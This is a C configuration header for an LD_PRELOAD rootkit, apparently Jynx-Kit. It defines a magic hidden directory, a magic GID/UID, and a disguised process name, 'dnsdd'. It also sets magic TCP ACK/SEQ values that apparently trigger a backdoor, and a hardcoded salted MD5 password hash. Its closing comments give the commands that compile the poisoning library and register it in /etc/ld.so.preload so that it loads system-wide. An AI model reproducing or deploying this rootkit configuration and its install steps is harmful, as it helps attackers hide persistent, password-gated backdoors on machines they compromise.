#ifndef CONFIG_H
#define CONFIG_H

#define MAGIC_DIR "dnsdyn"
#define MAGIC_GID 188
#define MAGIC_UID 74
#define CONFIG_FILE "ld.so.preload"

#define APP_NAME "dnsdd"
//#define MAGIC_ACK 0xdead
//#define MAGIC_SEQ 0xbeef
#define MAGIC_ACK 0x10e10488
#define MAGIC_SEQ 0xf363f879

//normal ack and seq
//ack:0x10e10488
//seq:0xf363f879

//#define SOURCE_PORT 34678

//password is the md5(_SALT_+md5(your_type_in_password));
#define _RPASSWORD_ "a7ae32a7f77b0838b977fcb6c7cca236"
#define _SALT_ "ooxx"
#define SALT_LENGTH 4

//#define DEBUG
//#define DEBUG_IP

#endif
//echo ""> /etc/ld.so.preload
//echo /mnt/hgfs/work_virtual/Jynx-Kit/ld_poison.so > /etc/ld.so.preload 
//gcc -Wall -fPIC -shared -ldl ld_poison.c -o ld_poison.so
